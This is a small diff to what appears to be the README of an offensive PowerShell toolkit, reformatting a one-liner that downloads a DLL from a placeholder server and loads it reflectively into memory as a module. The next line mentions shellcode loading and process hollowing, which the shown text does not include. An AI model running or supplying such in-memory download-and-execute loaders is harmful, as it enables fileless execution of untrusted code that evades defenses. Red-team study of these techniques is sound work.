@@ -3,7 +3,8 @@
 How i usually load it
 
 ```powershell
-$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolkit.dll -UseBasicParsing).Content);Import-Module -Assembly $a
+$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolkit.dll -UseBasicParsing).Content);
+Import-Module -Assembly $a
 ```
 
 Example of remotely loading and encrypting shellcode, then performing proc hollow with it
